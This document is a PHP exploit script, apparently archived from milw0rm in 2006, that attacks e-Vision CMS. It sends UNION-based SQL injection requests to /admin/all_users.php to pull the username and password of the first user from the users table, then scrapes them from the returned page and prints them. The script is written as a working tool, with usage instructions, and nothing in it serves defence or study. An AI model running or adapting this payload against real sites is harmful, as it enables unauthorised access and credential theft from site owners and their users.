#!/usr/bin/php -q -d short_open_tag=on
<?
/*
/* e-Vision CMS Remote sql injection exploit
/*            By : HACKERS PAL
/*             WwW.SoQoR.NeT
*/
print_r('
/**********************************************/
/* e-Vision CMS Remote sql injection exploit  */
/*    by HACKERS PAL <security@soqor.net>     */
/*        site: http://www.soqor.net          */');
if ($argc<2) {
	print_r('
/* --                                         */
/* Usage: php '.$argv[0].' host
/* Example:                                   */
/*    php '.$argv[0].' http://localhost/evision
/**********************************************/
');
	die;
}
error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

$url=$argv[1];
$exploit="/admin/all_users.php?from=-1%20union%20select%20null,null,null,username,null%20from%20users%20where%20idusers=1/*";
$exploit2="/admin/all_users.php?from=-1%20union%20select%20null,null,null,pass,null%20from%20users%20where%20idusers=1/*";

Function get_page($url)
{

	if(function_exists("file_get_contents"))
	{

		$contents = file_get_contents($url);

	}
	else
	{
		$fp=fopen("$url","r");
		while($line=fread($fp,1024))
		{
			$contents=$contents.$line;
		}


	}
	return $contents;
}

function get($var)
{
	if(strlen($var[1])>0)
	{
		Echo trim($var[1]);
	}
}

$page = get_page($url.$exploit);
$page2 = get_page($url.$exploit2);

if(preg_match('/\<td bgcolor=\"#C2D4E8\">(.+?)<\/td\>/is',$page))
{
	Echo "\n[+] User Name : ";
	preg_replace_callback('/\<td bgcolor=\"#C2D4E8\">(.+?)<\/td\>/is','get',$page);
	Echo "\n[+] Pass Word : ";
	preg_replace_callback('/\<td bgcolor=\"#C2D4E8\">(.+?)<\/td\>/is','get',$page2);
	Die("\n/* Visit us : WwW.SoQoR.NeT                   */\n/**********************************************/");
}

Die("\n[-] Exploit Failed\n/* Visit us : WwW.SoQoR.NeT                   */\n/**********************************************/");
?>

# milw0rm.com [2006-09-22]
